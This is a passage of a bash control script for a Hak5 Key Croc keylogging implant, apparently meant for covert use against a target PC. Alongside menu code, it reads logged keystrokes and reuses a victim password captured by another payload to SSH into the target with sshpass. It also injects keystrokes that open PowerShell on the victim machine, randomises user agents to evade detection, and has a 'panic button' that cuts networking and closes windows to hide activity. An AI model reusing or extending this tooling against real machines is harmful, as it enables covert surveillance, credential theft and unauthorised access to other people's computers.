#!/bin/bash
#
##
# Title:         Croc_Pot
# Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
#                SSH to HAK5 gear, Reverse ssh tunnel, and more
# Author:        Spywill
# Version:       1.8.0
# Category:      Key Croc
##
##
#----Payload  Variables
##
LINE=$(perl -e 'print "=" x 80,"\n"')
LINE_=$(perl -e 'print "*" x 10,"\n"')
LINE_A=$(perl -e 'print "-" x 15,"\n"')
spinstr='|/-\'
#----Validate IP v4 or v6 address
#----source: http://stackoverflow.com/a/9221063
validate_ip="^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$"
##
#----Create Croc_Pot folders
##
if [[ -d "/root/udisk/loot/Croc_Pot" && "/root/udisk/tools/Croc_Pot" ]]; then
	LED B
else
	mkdir -p /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
fi
##
#----Color Variables
##
green='\e[40;32m'
blue='\e[40;34m'
red='\e[40;31m'
white='\e[40;97m'
yellow='\e[40;93m'
pink='\e[40;35m'
cyan='\e[40;36m'
clear='\e[0m'
##
#----Color Functions
##
ColorGreen() {
	echo -ne ${green}${1}${clear}
}
ColorBlue() {
	echo -ne ${blue}${1}${clear}
}
ColorYellow() {
	echo -ne ${yellow}${1}${clear}
}
ColorRed() {
	echo -ne ${red}${1}${clear}
}
##
#----Hide cursor with tput in terminal/restore when exit Function
##
tput civis
function restore_cursor() {
	tput cnorm
	killall Croc_Pot.sh tcpdump 2> /dev/null
}
trap restore_cursor EXIT
##
#----All Menu color Functions
##
function MenuTitle() {
	echo -ne "\n\t\t\t\e[41;38;5;232;1m ${*} ${clear}\n"
}
function MenuColor() {
	local m_c='\e[40;38;5;202;4m'
	echo -ne "\t\t\t\e[40;1m${2}${clear}${green}->${clear}$(awk -v m=${1} '{printf("'${m_c}'%-'${1}'s\n", $0)}' <<< ${@:3})${clear}\n"
}
function MenuEnd() {
	unset u_a m_a chartCount
	echo -ne "\t\t\t\e[40;1m0${clear}${green}->${clear}\e[40;4;32mEXIT $(awk -v m=${1} '{printf("%-'${1}'s'${clear}${green}${array[3]}' '${clear}'\n", $0)}' <<< ${green})\n"
	echo -ne "`tput sc`\t\t\e[38;5;19;1;48;5;245mCHOOSE AN OPTION AND PRESS [ENTER]:${clear}`tput sc`"
while IFS= read -r -n1 -s u_a; do
	case "$u_a" in
	$'\0')
		kill -9 ${title_pid} 2>/dev/null && wait ${title_pid} 2>/dev/null ; break ;;
	$'\177')
		if [ ${#m_a} -gt 0 ]; then
		echo -ne "\b \b`tput sc`"
		m_a=${m_a::-1}
		fi ;;
	*)
		chartCount=$((chartCount+1))
		echo -ne "\e[48;5;202;30m${u_a}${clear}`tput sc`"
		m_a+="$u_a" ;;
	esac
done
echo -ne "\n"
}
##
#----Croc_Pot invalid entry
##
function invalid_entry() {
	LED R
	echo -ne "\n\t${LINE_}\e[5m$(ColorRed 'INVALID ENTRY PLEASE TRY AGAIN')${LINE_}\n"
	sleep 1
	LED OFF
}
##
#----read user input/add color
##
function read_all() {
	unset a_r r_a chartCount
	echo -ne "\e[38;5;19;1;48;5;245m${*}:${clear}"
while IFS= read -r -n1 -s a_r; do
	case "$a_r" in
	$'\0')
		break ;;
	$'\177')
		if [ ${#r_a} -gt 0 ]; then
		echo -ne "\b \b"
		r_a=${r_a::-1}
		fi ;;
	*)
		chartCount=$((chartCount+1))
		echo -ne "\e[48;5;202;30m${a_r}${clear}"
		r_a+="$a_r" ;;
	esac
done
echo -ne "\n"
}
##
#----function for Breaking while loop
##
function reset_broken() {
	broken=0
break_script() {
	broken=1
}
trap break_script SIGINT
}
##
#----Display info/how to 
##
function Info_Screen() {
	echo -ne "\n\e[48;5;202;30m${LINE}${clear}\n"
	echo -ne "${1}" | awk -v m=80 '{printf("'${yellow}'%-80s'${clear}'\n", $0)}' | sed '1d'
	echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
}
##
#----display Countdown in minutes and seconds
##
function Countdown() {
	local min=${1}
	local sec=${2}
while [ $min -ge 0 ]; do
	while [ $sec -ge 0 ]; do
	if [ "$min" -eq "0" ] && [ "$sec" -le "59" ]; then
		echo -ne "${yellow}"
	else
		echo -ne "${green}"
	fi
	if [ "$min" -eq "0" ] && [ "$sec" -le "10" ]; then
		echo -ne "${red}"
	fi
	if [ "$min" -eq "0" ] && [ "$sec" -eq "0" ]; then
		echo -ne "${clear}"
		break
	fi
		local temp=${spinstr#?}
		echo -ne "`tput sc`$(printf "%02d" $min):$(printf "%02d" $sec)${clear}\e[40;3$(( $RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")${clear}${yellow}${@:3}${clear}\033[0K\r"
		local spinstr=$temp${spinstr%"$temp"}
		let "sec=sec-1"
		sleep 1
	done
	sec=59
	let "min=min-1"
done
}
##
#----Random the user-agent to help avoid detection on some recon scan
##
function user_agent_random() {
	userAgentList=(
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3"
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152;"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20061201 Firefox/2.0.0.17 (Ubuntu-feisty)"
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B367"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 1.1.4322; InfoPat"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4"
)
userAgent="${userAgentList[ $(expr $(( $RANDOM )) \% ${#userAgentList[*]}) ]}"
}
##
#----Replace user input with Asterisk (*)
##
function user_input_passwd() {
	unset password chartCount
	echo -ne "\e[38;5;19;1;48;5;245mENTER ${2} PASSWORD AND PRESS [ENTER]:${clear}"
while IFS= read -r -n1 -s char; do
	case "$char" in
	$'\0')
		break ;;
	$'\177')
		if [ ${#password} -gt 0 ]; then
		echo -ne "\b \b"
		password=${password::-1}
		fi ;;
	*)
		chartCount=$((chartCount+1))
		echo -ne "\e[48;5;202;30m*${clear}"
		password+="$char" ;;
	esac
done
echo $password >> ${1}
echo -ne "\n"
}
##
#----Check for OS from saved Croc_Pot_Payload scan
##
function OS_CHECK() {
	if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = WINDOWS ]; then
		echo "WINDOWS"
	elif [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = LINUX ]; then
		echo "LINUX"
	else
		echo -ne "${red}INVALID OS${clear}\n"
	fi 2> /dev/null
}
##
#----Check for target PC ip from saved Croc_Pot_Payload scan
##
function os_ip() {
	if [ -f "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
		if [[ "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)" =~ ${validate_ip} ]]; then
			echo -ne "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
		else
			echo -ne "${red}Invalid target IP${clear}\n"
		fi
	else
		echo -ne "${red}Run Croc_Pot_payload to get target IP${clear}\n"
	fi 2> /dev/null
}
##
#----Check for target pc passwd (Need to run CrocUnlock payload)
##
function target_pw() {
	if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
		echo -ne "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\n"
	else
		echo -ne "\e[5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')\n"
	fi 2> /dev/null
}
##
#----Check for keycroc save passwd at /tmp/CPW.txt if not enter password and valid password
##
function croc_passwd_check() {
	local salt=$(getent shadow root | cut -d$ -f3)
	local epassword=$(getent shadow root | cut -d: -f2)
if [ -e /tmp/CPW.txt ]; then
	local password=$(sed -n 1p /tmp/CPW.txt)
	local mpassword=$(python -c 'import crypt; print crypt.crypt("'"${password}"'", "$6$'${salt}'")')
	if [ ${mpassword} == ${epassword} ]; then
		LED G
		echo -ne "\n${green}VALID PASSWORD${clear}\n"
	else
		LED R
		echo -ne "${red}INVALID PASSWORD PLEASE TRY AGAIN${clear}\n"
		rm /tmp/CPW.txt
		croc_passwd_check
	fi
else
	user_input_passwd /tmp/CPW.txt KEYCROC
	local mpassword=$(python -c 'import crypt; print crypt.crypt("'"${password}"'", "$6$'${salt}'")')
	if [ ${mpassword} == ${epassword} ]; then
		LED G
		echo -ne "${green}VALID PASSWORD${clear}\n"
	else
		LED R
		echo -ne "${red}INVALID PASSWORD PLEASE TRY AGAIN${clear}\n"
		rm /tmp/CPW.txt
		croc_passwd_check
	fi
fi
}
croc_passwd_check
##
#----Stop/start ping alert by pressing [kp] in Croc_Pot main Main Menu
##
function start_ping() {
	echo -ne "$(Info_Screen '
-Ping alert will run in background
-Alert will appear in terminal incoming ping [icmp]
-In Croc_Pot Main Menu press [kp] to stop/start Ping alert ')\n\n"
	if ps -p "$(sed -n 1p /tmp/ping_pid.txt)" 2> /dev/null ; then
		echo -ne "\n${yellow}Killing ping alert${clear}\n"
		kill -9 $(sed -n 1p /tmp/ping_pid.txt) 2> /dev/null && wait $(sed -n 1p /tmp/ping_pid.txt) 2> /dev/null
		unset PING_STATUS ; PING_STATUS="${red}" ; rm /tmp/ping_pid.txt ; sleep 1
	else
##
#----tcpdump, alert when the keycroc is being pinged and temporarily stopping incoming ping for 1 min
##
	ping_alert() {
		until tcpdump -n -c 1 ip proto \\icmp 2> /dev/null | egrep "request" | egrep -o '^[^id]+' ; do
			:
		done
		LED C FAST
		sysctl -w net.ipv4.icmp_echo_ignore_all=1 > /dev/null 2>&1 
		tput sc ; echo -ne "${yellow}keycroc is being pinged temporarily disabling incoming ping ${clear}" ; sleep 4 ; tput rc ; tput el
		tput sc ; Countdown 1 15 INCOMING PING DISABLED ; tput rc ; tput el ; sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
		tput sc ; echo -ne "${yellow}INCOMING PING IS ENABLED${clear}" ; sleep 4 ; tput rc ; tput el ; rm /tmp/ping_pid.txt
		ping_alert & echo -ne $! > /tmp/ping_pid.txt ; LED OFF
	}
		read_all START PING ALERT Y/N AND PRESS [ENTER]
		case $r_a in
		[yY] | [yY][eE][sS])
			PING_STATUS="\e[5m${cyan}"
			P_A="${yellow}PING ALERT: ${clear}${green}RUNNING${clear}"
			echo -ne "\n${yellow}STARTING PING ALERT${clear}\n"
			ping_alert & echo -ne $! > /tmp/ping_pid.txt ;;
		[nN] | [nN][oO])
			PING_STATUS="${red}"
			P_A="${yellow}PING ALERT: ${clear}${red}NOT RUNNING${clear}" ;;
		*)
			PING_STATUS="${red}"
			invalid_entry ; P_A="${yellow}PING ALERT: ${clear}${red}NOT RUNNING${clear}" ;;
		esac
	fi 2> /dev/null
}
start_ping
clear
##
#----Check /tmp/cc-client-error.log count number or errors
##
if [[ -f /tmp/cc-client-error.log ]]; then
	echo -ne "${yellow}TMP CLIENT-ERROR COUNT: ${clear}${red}$(wc -l < /tmp/cc-client-error.log)${clear}\n"
fi
##
#----Change keycroc timezone to local timezone with curl
##
user_agent_random
croc_timezone=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=timezone)
if [ -z "$croc_timezone" ]; then
	croc_timezone=$(timedatectl | grep -e 'Time zone' | awk {'print $3'})
	echo -ne "${yellow}KEYCROC TIMEZONE SET FOR ${clear}${green}${croc_timezone}${clear}\n"
elif [[ "$croc_timezone" == "$(timedatectl | grep -e 'Time zone' | awk {'print $3'})" ]]; then
	LED G
	echo -ne "${yellow}KEYCROC TIMEZONE SET FOR ${clear}${green}${croc_timezone}${clear}\n"
else
	LED SETUP
	echo -ne "${yellow}CHANGING KEYCROC TIMEZONE TO ${clear}${green}${croc_timezone}${clear}\n"
	timedatectl set-timezone ${croc_timezone}
fi
##
#----check if keyboard PRESENT or MISSING with (KEYBOARD) command
##
function keyboard_check() {
	if [[ $(KEYBOARD) = PRESENT ]]; then
		echo -ne "${yellow}KEYBOARD: ${clear}${green}PRESENT $(cat /tmp/mode)${clear}\n"
	elif [[ $(KEYBOARD) = MISSING ]]; then
		echo -ne "${yellow}KEYBOARD: ${clear}${red}MISSING${clear}\n"
	fi
}
keyboard_check
##
#----Check for root privileges
##
echo -ne "${yellow}KEYCROC UID: ${clear}${green}${UID}-${clear}"
if [ "${UID}" -eq 0 ]; then
	echo -ne "${green}ROOT ACCESS${clear}\n"
else
	echo -ne "${red}NO ROOT ACCESS${clear}\n"
fi
##
#----Croc_Pot file count
##
echo -ne "\n${yellow}CROC_POT FILE COUNT: LINES:${clear}${green}$(wc -l /root/udisk/tools/Croc_Pot.sh | awk {'print $1'})${clear}${yellow} WORDS:${clear}${green}$(wc -w /root/udisk/tools/Croc_Pot.sh | awk {'print $1'})${clear}${yellow} CHARACTERS:${clear}${green}$(wc -m /root/udisk/tools/Croc_Pot.sh | awk {'print $1'})${clear}\n"
##
#----Number of times Croc_Pot has started up
##
function C_P_T() {
	local c_p_t=/root/udisk/tools/Croc_Pot/Count_Croc_Pot.txt
	if [[ -e ${c_p_t} ]]; then
		LED G
	else
		echo $(( i++ )) > ${c_p_t}
	fi
local var=$(sed -n 1p ${c_p_t})
local var=$(( $var + 1 ))
	if [ $var -eq 1 ]; then
		echo -ne "${yellow}CROC_POT FIRST STARTUP THANK YOU AND ENJOY :) ${clear}${green}${var}${clear}\n"
	else
		echo -ne "${yellow}CROC_POT STARTUP: ${clear}${green}${var}${clear}${yellow} TIMES${clear}${yellow} LAST STARTUP:${clear}${green} $(sed -n 2p ${c_p_t})\n"
	fi
echo -ne "${var}\n$(date +%b-%d-%y-%r)\n" > ${c_p_t} 2> /dev/null
}
C_P_T
##
#----Quick ckeck info on startup
##
echo -ne "${cyan}UID  PID  PPID C STIME TTY    CMD${clear}\n"
echo -ne "${green}$(ps -ef | grep "Croc_Pot.sh" | awk 'FNR <= 1' | awk '{$7 = ""};1')${clear}\n\n"
echo -ne "${yellow}CURRENTLY FOUND: ${clear}${green}$(cat /root/udisk/loot/croc_char.log | wc -m) ${clear}${yellow}CHARACTERS IN croc_char.log${clear}\n"
echo -ne "${yellow}INSTALLED PAYLOADS: ${clear}${green}$(ls /root/udisk/payloads | grep ".txt" | wc -l)${clear}\n\n"
echo -ne "${cyan}$(df -h | sed -n '1p' | awk '{ print toupper($0); }')${clear}\n${green}$(df -h | sed -n '2,10p')${clear}\n\n"
##
#----Check NumLock state ON or OFF
##
unset -f ping_alert && killall tcpdump 2> /dev/null
ping -q -c 1 -w 1 "$(os_ip)" &>"/dev/null"
if [[ $? -ne 0 ]]; then
	echo -ne "${yellow}NUMLOCK STATE: ${clear}${red}UNKNOWN ${clear}${yellow}Unable to ping target${clear}\n"
elif [[ "${#args[@]}" -eq 0 ]]; then
	if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
		TARGET_USERNAME=$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
		if [ "$(OS_CHECK)" = WINDOWS ]; then
			if [ -f /root/udisk/tools/Croc_Pot/NumLock.txt ]; then
				if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/NumLock.txt)" = True ]; then
					echo -ne "${yellow}NUMLOCK STATE: ${clear}${green}ON${clear}\n"
				elif [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/NumLock.txt)" = False ]; then
					echo -ne "${yellow}NUMLOCK STATE: ${clear}${red}OFF${clear}\n"
				fi
				rm /root/udisk/tools/Croc_Pot/NumLock.txt 2> /dev/null
			else
				echo -ne "${yellow}NUMLOCK STATE: ${clear}${red}UNKNOWN Run Croc_Pot_Payload${clear}\n"
			fi
		elif [ "$(OS_CHECK)" = LINUX ]; then
			NUM_STATUS=$(sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'export DISPLAY=:0 ; echo `xset -q | grep -Po "(?<=Num Lock:)\W*\K[^ ]*"`')
			if [ "$NUM_STATUS" = off ]; then
				Q NUMLOCK
				echo -ne "${yellow}NUMLOCK STATE: ${clear}${green}TURNED TO ON STATE${clear}\n"
			elif [[ "$NUM_STATUS" = on ]]; then
				echo -ne "${yellow}NUMLOCK STATE: ${clear}${green}${NUM_STATUS^^}${clear}\n"
			else
				echo -ne "${yellow}NUMLOCK STATE: ${clear}${red}UNKNOWN${clear}\n"
			fi
		fi
	else
		echo -ne "${yellow}NUMLOCK STATE: ${clear}${red}UNKNOWN ${clear}${yellow}-Run Croc_unlock payload-${clear}\n"
	fi
fi
echo -ne "$P_A\n"
##
#----Save keycroc Original Mac address, Check Original Mac Address or spoof
##
function check_mac() {
	if [ -f "/root/udisk/tools/Croc_Pot/croc_original_mac.txt" ]; then
		test_mac=$(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)
		if [ "$test_mac" = "$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)" ]; then
			echo -ne "${yellow}ORIGINAL MAC: ${clear}${green}$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)${clear}\n"
		else
			echo -ne "${yellow}SPOOF MAC: ${clear}${red}$test_mac${clear}\n"
		fi
	else
		cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address > /root/udisk/tools/Croc_Pot/croc_original_mac.txt 2> /dev/null
		echo -ne "${yellow}ORIGINAL MAC: ${clear}${green}$(sed -n 1p /root/udisk/tools/Croc_Pot/croc_original_mac.txt)${clear}\n"
	fi
}
check_mac
##
#----Croc_Pot title function
##
function croc_title() {
	LED OFF
	local k_b=$(awk -v m=24 '{printf("%-24s\n", $0)}' <<< $(lsusb | sed -n '/Linux Foundation\|Realtek Semiconductor/!p' | sed 's/^.*ID/ID/' | sed 's/ID//' | sed 's/,//' | awk '{print $1,$2}'))
##
#----Test internet connection
##
internet_test() {
	unset -f ping_alert && killall tcpdump 2> /dev/null
	ping -q -c 1 -w 1 "8.8.8.8" &>"/dev/null"
if [[ $? -ne 0 ]]; then
	echo -ne "OFFLINE" | awk -v m=10 '{printf("'${red}'%-10s\n", $0)}'
elif [[ "${#args[@]}" -eq 0 ]]; then
	echo -ne "ONLINE" | awk -v m=10 '{printf("'${green}'%-10s\n", $0)}'
fi
}
##
#----Croc_Pot title display info
##
while : ; do
	echo -ne "`tput cup 0 0`\n\e[41;38;5;232;1m${LINE}${clear}
${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.8.0${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname | awk '{ print toupper($0); }') IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
${blue}AUTHOR: ${clear}${yellow}SPYWILL${clear}${cyan}   $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< $(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g'))${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname | awk '{ print toupper($0); }') VER: $(cat /root/udisk/version.txt) ${clear}${PING_STATUS}*${clear}${yellow}TARGET-PC:${clear}${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< ${croc_timezone^^})${clear}${cyan} $(date +%b-%d-%y-%r | awk '{ print toupper($0); }')${clear}\e[41;38;5;232mΩ${clear}${yellow} KEYBOARD:${clear}${green}$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ${clear}${yellow}ID:${clear}${green}${k_b^^}${clear}
\e[40;38;5;202m»»»»»»»»»»»» ${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]}${clear}\e[40;38;5;202m «««««««««««««${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} TEMP:${clear}${cyan}$(cat /sys/class/thermal/thermal_zone0/temp)°C${clear}${yellow} USAGE:${clear}${cyan}$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}'))${clear}${yellow}MEM:${clear}${cyan}$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< $(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }'))${clear}
\e[41;38;5;232;1m${LINE}${clear}\n\n`tput rc`" ; sleep 4
done & title_pid=$!
}
##
#----Croc_Pot title for loot
##
function croc_title_loot() {
	echo -ne "\n${LINE}\n\t${LINE_A}>CROC_POT<${LINE_A}\n\t\tAUTHOR: SPYWILL\n\t\tDATE OF SCAN-$(date +%b-%d-%y---%r)\n\t${LINE_A}>KEYCROC-HAK5<${LINE_A}\n${LINE}\n\n"
}
##
#----Array for special characters
##
if [ "$(OS_CHECK)" = WINDOWS ]; then
	array=(5 ♂ ¶ ► ◘ ∞ ☼ ♠ ‼ ↔ ↕ ♫)
elif [ "$(OS_CHECK)" = LINUX ]; then
	array=(❺ ♁ ᛝ ➲ ✉ ∞ ✓ ∵ ✏ ⇆ ♲ ☁)
	HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
else
	array=(5 \# \# \# \# \# \# \# \# \# \# \#)
fi
##
#----Check for install package option to install package
##
function install_package() {
	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "${1}" 2>&1)"
if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
	read_all DOWNLOAD AND INSTALL ${2} Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		apt -y install ${1} ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n"
		${4}
		clear ;;
	*)
		invalid_entry ; ${3} ;;
	esac
else
	echo -ne "\n${green}Package ${2} is already installed${clear}\n\n"
fi
}
##
#----Start default web brower on target pc
##
function start_web() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Start-Process ${1} ; exit" ; Q ENTER
else
	case $HOST_CHECK in
	raspberrypi)
		Q CONTROL-ALT-t ; sleep 1 ; Q STRING "chromium-browser ${1} & exit" ; Q ENTER ;;
	$HOST_CHECK)
		Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1} & exit" ; Q ENTER ;;
	*)
		Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1} & exit" ; Q ENTER ;;
	esac
fi
}
##
#----display Spinner while waiting for progress
##
function displaySpinner() {
	local s=1
	while [ "$(ps a | awk '{print $1}' | grep $!)" ]; do
		local temp=${spinstr#?}
		echo -ne "\e[40;3$(( $RANDOM * 6 / 32767 +1 ))m$(printf "${*} [%c]" "$spinstr")${clear}${yellow}-$((s++))${clear}\033[0K\r"
		local spinstr=$temp${spinstr%"$temp"}
		sleep 0.3
	done
echo -ne "\r"
echo -ne "${yellow}Progress has finished${clear}\033[0K\r"
}
##
#----Panic button press [P] in any menu will close all application and open login screen
#----And kill wlan0 interface to restore wlan0 interface wait 1 min or unplug keycroc and plug back in
##
function Panic_button() {
	clear ; LED R
	echo -ne "#!/bin/bash\nPID_WPA=\$(pidof wpa_supplicant)\nPID_DHC=\$(pidof dhclient)\nsleep 60\nifconfig wlan0 up\nkill -9 \$PID_WPA && kill -9 \$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0\nLED B\n" > /tmp/reset_net.txt
	chmod +x /tmp/reset_net.txt
	echo -ne "\n\n${red}Panic button was pressed\nClosing all application opening login screen\nKilling wlan0 interface\nExit Croc_Pot\nRestore wlan0 interface in 1 min or unplug keycroc and plug back in${clear}\n\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
		ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
		Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE ; Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE
		Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE ; Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE
		Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE ; Q HOLD KEYCODE 04,00,2b,00 ; Q DELETE ; Q RELEASE
		Q ENTER ; Q GUI-l
		exit
elif [ "$(OS_CHECK)" = LINUX ]; then
	case $HOST_CHECK in
	raspberrypi)
		ip link set dev wlan0 down ; bash /tmp/reset_net.txt &
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-TAB ; Q ALT-F4 ; Q ALT-F4 ; Q ALT-F4 ; Q ENTER
		Q ALT-F4 ; Q CONTROL-ALT-F3
		exit ;;
	$HOST_CHECK)
